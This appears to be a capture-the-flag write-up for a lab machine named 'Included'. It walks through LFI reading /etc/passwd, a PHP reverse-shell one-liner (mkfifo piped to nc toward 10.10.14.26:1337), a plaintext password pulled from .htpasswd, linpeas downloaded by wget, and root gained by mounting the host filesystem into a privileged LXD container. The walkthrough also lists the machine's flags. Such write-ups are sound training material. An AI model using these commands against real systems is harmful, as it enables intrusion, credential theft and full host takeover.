-----

## Initial Information-

### IPs

Victim IP = 10.129.161.76

Date Started:2023-04-11

----
## Initial Recon

```shell
 nmap -p- -sV  included.htb 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 04:58 EDT
Nmap scan report for included.htb (10.129.71.243)
Host is up (0.050s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.97 seconds

```

- Entered the url in the page got brought to the home page of the site. In the url this gave the page in the directory as a parameter. this means that the site is suseptable to Local File inclusion.
```text
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false mike:x:1000:1000:mike:/home/mike:/bin/bash tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin 
```

- Given that tftp uses UDP, I decided to scan for UDP ports with nmap and did find that there is a port open
```shell

```

- Bsed on research  in the man files for tftp I found that it doesnt require authentication like ftp and requires a custom solution on the server.
----
## Foothold

- Given that we can load localfiles I decided to see if we can do a basic reverse shell, this didn't work as I didnt get a response in the cmd. This means that we dont have Remote File inclusion
```shell
──(root㉿kali)-[/home/kali/Desktop/included]
└─# ls                     
shell.php
                                                                                                                    
┌──(root㉿kali)-[/home/kali/Desktop/included]
└─# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


```

- I then tried to do a basic remote in the url but this didnt work so i added the shell to the file that was uploaded 
```shell
 cat exploit.php        
<?php
            system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.26 1337 >/tmp/f");
    
?>
```

- ran the script and the browser created the shell
```shell
$ whoami
www-data
$ pwd
/var/www/html
$ 
ls



www-data@included:/var$ ^Z
zsh: suspended  nc -lvnp 1337
                                        
stty raw -echo; fg;           




[12]    continued  nc -lvnp 1337
          export TERM=xterm
www-data@included:/var$ 
```
- I then looked in the files for the the www and found the .htpasswd file for mike.
```shell
www-data@included:/var/www/html$ cat .htpasswd 
mike:Sheffield19
www-data@included:/var/www/html$ 

```
- I then tried to su into mike  and managed to gain access to that user
```shell
www-data@included:/var/www/html$ su mike
Password: 
mike@included:/var/www/html$ 

```
- Went to the 
- got the user flag
```shell
a56ef91d70cfbf2cdb8f454c006935a1
```

- the vitim machine i installed linpeas on the /tmp folder so that we can focus on getting root access, created the server on the kali machine
```shell
mike@included:/tmp$ wget http://10.10.14.26/linpeas.sh 
--2023-04-12 16:22:21--  http://10.10.14.26/linpeas.sh
Connecting to 10.10.14.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828287 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.87K  2.13MB/s    in 0.4s    

2023-04-12 16:22:21 (2.13 MB/s) - ‘linpeas.sh’ saved [828287/828287]

mike@included:/tmp$ chmod -x linpeas.sh 
mike@included:/tmp$ ./linpeas.sh
bash: ./linpeas.sh: Permission denied
mike@included:/tmp$ chmod +x linpeas.sh 
mike@included:/tmp$ ./linpeas.sh

```
- then proceeded to download the repository that  and create the exploit using the builder
```shell


sudo su

#Install requirements

sudo apt update

sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

#Clone repo

git clone https://github.com/lxc/distrobuilder

#Make distrobuilder

cd distrobuilder

make

#Prepare the creation of alpine

mkdir -p $HOME/ContainerImages/alpine/

cd $HOME/ContainerImages/alpine/

wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

#Create the container

sudo $HOME/go/bin/distrobui
```


- on the victim machine need to import the files using a file server 
```shell
mike@included:/tmp$ wget 10.10.14.26/lxd.tar.xz
--2023-04-13 08:00:05--  http://10.10.14.26/lxd.tar.xz
Connecting to 10.10.14.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 884 [application/x-xz]
Saving to: ‘lxd.tar.xz’

lxd.tar.xz          100%[===================>]     884  --.-KB/s    in 0s      

2023-04-13 08:00:05 (21.4 MB/s) - ‘lxd.tar.xz’ saved [884/884]


mike@included:/tmp$ wget 10.10.14.26/rootfs.squashfs
--2023-04-13 08:00:38--  http://10.10.14.26/rootfs.squashfs
Connecting to 10.10.14.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2056192 (2.0M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs     100%[===================>]   1.96M  1.75MB/s    in 1.1s    

2023-04-13 08:00:40 (1.75 MB/s) - ‘rootfs.squashfs’ saved [2056192/2056192]

mike@included:/tmp$ 

```

- add the files to the image 
```shell
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image

```

- Create a container and add root path
```shell
lxc init alpine privesc -c security.privileged=true


lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

- Execute the container 
```shell
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

user flag = a56ef91d70cfbf2cdb8f454c006935a1
c693d9c7499d9f572ee375d4c14c7bcf
---
## Tags

----
## Resources

Tftp not requiring authentication - https://www.lifewire.com/definition-of-tftp-817576#:~:text=Unlike%20FTP%2C%20TFTP%20has%20no,TFTP%20is%20usually%20not%20allowed.